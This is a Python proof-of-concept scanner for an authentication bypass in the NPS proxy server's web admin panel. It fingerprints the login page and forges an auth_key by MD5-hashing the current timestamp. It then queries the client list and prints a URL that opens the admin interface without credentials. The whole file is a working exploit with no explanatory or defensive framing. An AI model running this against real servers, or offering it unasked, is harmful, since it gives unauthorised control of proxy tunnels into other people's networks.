import requests,re,urllib3,time
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

r1=int(time.time())
r2=md5(str(r1).encode()).hexdigest()
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"login/index"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "https://ehang.io/nps" in response.text and "beegosessionID=" in response.headers["Set-Cookie"]:
		finger=True
	else:
		finger=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"client/list"
	body="search=&order=asc&offset=0&limit=10&auth_key="+r2+"&timestamp="+str(r1)+""
	print(baseurl+'Index/Index?'+"auth_key="+r2+"&timestamp="+str(r1))
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "rows" in response.text and "total" in response.text:
		r0=True
	else:
		r0=False
	if finger and r0:
		return True
	else:
		return False
